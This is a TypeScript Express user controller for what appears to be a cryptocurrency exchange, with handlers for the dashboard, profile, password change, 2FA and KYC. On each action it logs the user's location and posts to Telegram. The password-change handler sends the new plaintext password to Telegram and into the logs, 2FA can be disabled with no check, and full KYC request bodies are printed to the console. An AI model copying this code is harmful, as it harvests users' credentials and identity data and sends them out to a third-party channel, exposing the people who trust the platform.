import * as express from 'express'
import { validationResult } from 'express-validator'
import ApiError from '../exeptions/api_error'
import UserServices from '../services/user_services'
import telegram from '../api/telegram_api'


async function saveUserLogs(id: number, email: string, ipAddress: string, city: string, countryName: string, coordinates: string, currentDate: string, userAction: string, userDomain: string) {

  const userLogs: any = await UserServices.saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, userDomain)
  if (userLogs) {
    console.log('result from save logs func is : ', userLogs)
    return { status: 'logs was recieved.' }
  }
  return { status: 'logs was rejected' }
}

class UserController {

  async dashboard(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // get user id & => 
      // get total balance & currency balances 
      const { id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName } = req.body
      console.log(req.body)
      const user: any = await UserServices.dashboard(id)
      console.log('found user is: ', user)

      await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, 'перешел на dashboard', domainName)
      await telegram.sendMessageByUserActions(email, ' перешел на dashboard ', domainName)

      return res.json(user)

    } catch (e) {
      next(e)
    }
  }

  async personalAreaProfile(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // get accoutn personal info
      const { id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName } = req.body
      console.log('req body: ', req.body);

      const user: any = await UserServices.personalAreaProfile(id)
      console.log('found user is: ', user)
      if (user) {
        await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, `перешел на ${userAction} `, domainName)
        await telegram.sendMessageByUserActions(email, ` перешел на ${userAction}`, domainName)
        return res.json({
          user: user,
          status: 'complete'
        })
      }
      return res.json({
        user: 'not found',
        status: 'rejected'
      })

    } catch (e) {
      next(e)
    }
  }

  async personalAreaProfileEdit(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      const { userId, userName, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
      console.log('req body: ', req.body);

      if (!userName && !userId) {
        return res.json({
          message: 'wrong data',
          status: 'rejected'
        })
      }
      const result: boolean = await UserServices.changeNameInProfile(userId, userName)
      if (result === false) {
        return res.json({
          message: 'error',
          status: 'rejected'
        })
      }
      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял имя на ${userName} `, domainName)
      await telegram.sendMessageByUserActions(userEmail, `поменял имя на ${userName} `, domainName)
      return res.json({
        message: 'name was changed',
        status: 'complete'
      })
    } catch (e) {
      next(e)
    }
  }

  async personalAreaSecurity(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // get accoutn security (2fa, login history)

    } catch (e) {
      next(e)
    }
  }

  async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // get accoutn security (2fa, login history)
      const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
      const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
      if (result === false) {
        console.log('operation status: ', result)
        return res.json({
          message: 'password doesn`t change',
          status: 'rejected'
        })
      }
      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на `, domainName)
      await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
      console.log('operation status: ', result)
      return res.json({
        message: 'password was change',
        status: 'complete'
      })


    } catch (e) {
      next(e)
    }
  }

  async disableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      const { userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName } = req.body
      console.log('req body: ', req.body);

      const result: boolean = await UserServices.disableUserTwoStep(userId)
      if (result === false) {
        console.log('error');
        return res.json({
          message: 'error',
          status: 'rejected'
        })
      }

      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, `выключил 2фа аутентификацию на`, domainName)
      await telegram.sendMessageByUserActions(userEmail, `выключил 2фа аутентификацию `, domainName)
      return res.json({
        message: '2fa turned off',
        status: 'complete'
      })


    } catch (e) {
      next(e)
    }
  }

  async personalAreaKyc(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      const {
        id,
        email,
        firstName,
        lastName,
        phoneNumber,
        dateOfBirth,
        documentNumber,
        mainAddress,
        zipCode,
        documentType,
        ipAddress,
        state,
        city,
        subAddress,
        countryName,
        coordinates,
        currentDate,
        userAction,
        domainName
      } = req.body

      console.log('req body kyc: ', req.body);


      const result: boolean = await UserServices.personalAreaSendKyc(id, firstName, lastName, email, phoneNumber, dateOfBirth, documentNumber, mainAddress, city, countryName, zipCode, documentType, 'pending', state, subAddress)
      console.log('operation result is: ', result)

      if (result === false) {
        return res.json({
          kyc: false,
          message: 'already added',
          stasus: 'rejected'
        })
      }
      await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, ' отправил KYC', domainName)
      await telegram.sendMessageByUserActions(email, ' отправил KYC', domainName)
      return res.json({
        kyc: true,
        stasus: 'complete'
      })

    } catch (e) {
      next(e)
    }
  }

  // async saveUserLogs(req: express.Request, res: express.Response, next: express.NextFunction) {
  //   try {
  //     const { id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, userDomain } = req.body

  //     await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, userDomain)
  //     await telegram.sendMessageByUserActions(email, userAction, userDomain)

  //   } catch (e) {
  //     next(e)
  //   }
  // }


  async getUserLogsToProfile() {
    try {

      // chat with support
    } catch (e) {
      console.log(e)
    }
  }

  async support(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // chat with support
    } catch (e) {
      next(e)
    }
  }

  // async wallet(req: express.Request, res: express.Response, next: express.NextFunction) {
  //   try {

  //   } catch (e) {
  //     next(e)
  //   }
  // }

  async deposit(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // deposit form & history
    } catch (e) {
      next(e)
    }
  }

  async withdraw(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // withdraw form & history
    } catch (e) {
      next(e)
    }
  }

  async swap(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // swap between currencies
    } catch (e) {
      next(e)
    }
  }

  async internalTransfer(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {
      // internal platform transfers
    } catch (e) {
      next(e)
    }
  }

  async secureDeal(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // secure deal form & history
    } catch (e) {
      next(e)
    }
  }

  async detailSecureDeal(req: express.Request, res: express.Response, next: express.NextFunction) {
    try {

      // current secure deal info & support chat
    } catch (e) {
      next(e)
    }
  }

}

export default new UserController()